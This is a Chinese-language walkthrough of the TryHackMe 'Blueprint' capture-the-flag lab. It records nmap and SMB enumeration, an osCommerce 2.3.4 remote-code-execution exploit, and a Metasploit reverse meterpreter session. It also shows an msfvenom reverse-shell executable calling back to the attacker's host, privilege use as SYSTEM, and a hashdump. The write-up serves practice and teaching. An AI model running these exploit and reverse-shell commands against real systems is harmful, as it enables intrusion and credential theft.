## 概述

來源: [tryhackme](https://tryhackme.com/room/blueprint)  
題目: Blueprint
難度: easy  
靶機: `10.10.82.106`

## 攻擊過程

### hosts
方便靶機重啟或斷線後測試
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ cat /etc/hosts   
...
10.10.82.106    blueprint.thm
...
```


### nmap 
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ nmap -sV -sC -v blueprint.thm   

Discovered open port 8080/tcp on 10.10.82.106
Discovered open port 3306/tcp on 10.10.82.106
Discovered open port 135/tcp on 10.10.82.106
Discovered open port 80/tcp on 10.10.82.106
Discovered open port 443/tcp on 10.10.82.106
Discovered open port 445/tcp on 10.10.82.106
Discovered open port 139/tcp on 10.10.82.106
Discovered open port 49160/tcp on 10.10.82.106
Discovered open port 49154/tcp on 10.10.82.106
Discovered open port 49159/tcp on 10.10.82.106
Discovered open port 49153/tcp on 10.10.82.106
Discovered open port 49158/tcp on 10.10.82.106
Discovered open port 49152/tcp on 10.10.82.106

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_ssl-date: TLS randomness does not represent time
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4s, deviation: 3s, median: -6s
| smb2-time: 
|   date: 2025-11-08T07:48:54
|_  start_date: 2025-11-08T07:30:11
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:b3:a4:aa:7d:cf (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-08T07:48:58+00:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

```

### smb
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ smbclient -L \\\\blueprint.thm -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
        Windows         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to blueprint.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

有透過 Users 撈到一些資料
但沒什麼進展
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ smbclient \\\\blueprint.thm\\Users -N         
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 12 06:36:40 2019
  ..                                 DR        0  Fri Apr 12 06:36:40 2019
  Default                           DHR        0  Tue Jul 14 15:17:20 2009
  desktop.ini                       AHS      174  Tue Jul 14 12:41:57 2009
  Public                             DR        0  Tue Jul 14 12:41:57 2009

                7863807 blocks of size 4096. 4762008 blocks available
smb: \> cd Default
smb: \Default\> dir
  .                                 DHR        0  Tue Jul 14 15:17:20 2009
  ..                                DHR        0  Tue Jul 14 15:17:20 2009
  AppData                           DHn        0  Tue Jul 14 10:37:05 2009
  Desktop                            DR        0  Tue Jul 14 10:04:25 2009
  Documents                          DR        0  Tue Jul 14 12:53:55 2009
  Downloads                          DR        0  Tue Jul 14 10:04:25 2009
  Favorites                          DR        0  Tue Jul 14 10:04:25 2009
  Links                              DR        0  Tue Jul 14 10:04:25 2009
  Music                              DR        0  Tue Jul 14 10:04:25 2009
  NTUSER.DAT                       AHSn   262144  Mon Jan 16 06:39:21 2017
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 10:28:04 2011
  NTUSER.DAT.LOG1                    AH   197632  Fri Apr 12 06:49:06 2019
  NTUSER.DAT.LOG2                    AH        0  Tue Jul 14 10:03:40 2009
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf    AHS    65536  Tue Jul 14 12:34:22 2009
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 12:34:22 2009
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 12:34:22 2009
  Pictures                           DR        0  Tue Jul 14 10:04:25 2009
  Saved Games                        Dn        0  Tue Jul 14 10:04:25 2009
  Videos                             DR        0  Tue Jul 14 10:04:25 2009

                7863807 blocks of size 4096. 4762008 blocks available
```

### searchsploit

發現 8080 用 oscommerce-2.3.4
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ searchsploit oscommerce 2.3.4 
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities              | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection            | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection         | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection          | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scrip | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload               | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution               | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)           | php/webapps/50128.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
找到很多漏洞嘗試利用
疑似有拿到 shell  
但都沒辦法移動路徑  
也沒辦法上傳檔案QQ  
不知道為什麼
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ python3 50128.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system

RCE_SHELL$ pwd

RCE_SHELL$ dir -force
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes


RCE_SHELL$ cd C:\Users\Administrator

RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

11/08/2025  08:03 AM    <DIR>          .
11/08/2025  08:03 AM    <DIR>          ..
04/11/2019  09:52 PM               447 application.php
11/08/2025  08:04 AM             1,118 configure.php
04/11/2019  09:52 PM    <DIR>          functions
               2 File(s)          1,565 bytes
               3 Dir(s)  19,509,276,672 bytes free

RCE_SHELL$ cd C:\
RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
```

## initial access
最後還是依靠大神
### msfconsle
```bash
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting           Required  Description
   ----     ---------------           --------  -----------
   Proxies                            no        A proxy chain of format type:host:port[,t
                                                ype:host:port][...]. Supported proxies: s
                                                apni, socks4, socks5, socks5h, http
   RHOSTS   blueprint.thm             yes       The target host(s), see https://docs.meta
                                                sploit.com/docs/using-metasploit/basics/u
                                                sing-metasploit.html
   RPORT    8080                      yes       The target port (TCP)
   SSL      false                     no        Negotiate SSL/TLS for outgoing connection
                                                s
   URI      /oscommerce-2.3.4/catalo  yes       The path to the install directory
            g/install/
   VHOST                              no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.4.11.38       yes       The listen address (an interface may be specified)
   LPORT  444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

meterpreter > getuid
Server username: SYSTEM

```

成功取得 user meterpreter

## Privilege Escalation
嘗試提權
製作一個 反射 .exe
> 要注意是 windows/meterpreter/reverse_tcp 不是 x64 
> 卡了一陣子才發現哈哈

```bash
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.11.38 LPORT=1234 -f exe  -o shell2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell2.exe                 
```

透過剛剛的 meterpreter 上傳 shell.exe
```bash
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
[*] Started reverse TCP handler on 10.4.11.38:444 
[*] Sending stage (40004 bytes) to 10.10.82.106
[*] Meterpreter session 3 opened (10.4.11.38:444 -> 10.10.82.106:49441) at 2025-11-08 17:03:16 +0800

meterpreter > dir
Listing: C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
==================================================================

Mode              Size             Type  Last modified                    Name
----              ----             ----  -------------                    ----
100666/rw-rw-rw-  1919850381759    fil   211641423418-10-04 14:56:45 +08  application.php
                                         00
100666/rw-rw-rw-  9500467660964    fil   239892541660-12-18 03:42:30 +08  configure.php
                                         00
040777/rwxrwxrwx  17592186048512   dir   211641423418-10-04 14:56:45 +08  functions
                                         00

meterpreter > upload shell2.exe
[*] Uploading  : /home/kali/tryhackme/blueprint/shell2.exe -> shell2.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/kali/tryhackme/blueprint/shell2.exe -> shell2.exe

```

先在另一個終端機開啟 windows/meterpreter/reverse_tcp 後再執行 shell.exe
```bash
meterpreter > execute -f shell2.exe
Process 9704 created.
```

另一個終端機開啟 windows/meterpreter/reverse_tcp
```bash
msf6 exploit(multi/handler) > show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, proces
                                        s, none)
   LHOST     10.4.11.38       yes       The listen address (an interface may be specified
                                        )
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```

這個要注意payload要改  
忘記改 payload 一直錯XD
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

成功取得 hashdump
```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.11.38:1234 
[*] Sending stage (177734 bytes) to 10.10.82.106
[*] Meterpreter session 7 opened (10.4.11.38:1234 -> 10.10.82.106:49450) at 2025-11-08 17:10:04 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aa...ee:54...11:::
Guest:501:aa...ee:31...c0:::
Lab:1000:aa...ee:30...50:::
meterpreter > 
```
> 可參考 [QA-decrypted](QA-decrypted.md) 破解 hash

取得 admin shell 拿到 root.txt
```bash
meterpreter > shell
Process 9876 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{...}

```


## 參考
- https://github.com/AbdullahRizwan101/CTF-Writeups/blob/master/TryHackMe/Blueprint.md
- https://github.com/strange07/tryhackme/blob/master/Blueprint/blueprint.md